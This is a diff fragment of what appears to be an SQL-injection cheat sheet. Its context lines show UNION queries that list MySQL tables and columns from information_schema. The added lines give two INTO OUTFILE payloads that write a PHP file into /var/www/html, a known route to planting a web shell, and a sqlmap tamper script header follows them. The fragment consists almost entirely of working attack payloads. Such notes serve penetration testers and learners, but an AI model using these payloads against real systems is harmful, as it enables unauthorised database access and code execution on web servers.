@@ -16,6 +16,14 @@ SELECT * FROM Customers where CustomerID=1 and 1=0 union select 1,2,3,4,5,6,grou
 -- mysql column
 SELECT * FROM Customers where CustomerID=1 and 1=0 union select 1,2,3,4,5,6,group_concat(column_name,0x20) from information_schema.columns where database()='northwind'
 
+
+# union
+union select 1,2,3,4,5,"<? phpinfo(); ?>" into outfile "/var/www/html/test.php"
+
+# no union
+into outfile '/var/www/html/test.php" fields terminated by "<? phpinfo(); ?>"
+
+
 # sqlmap tamper
 #!/usr/bin/env python
 
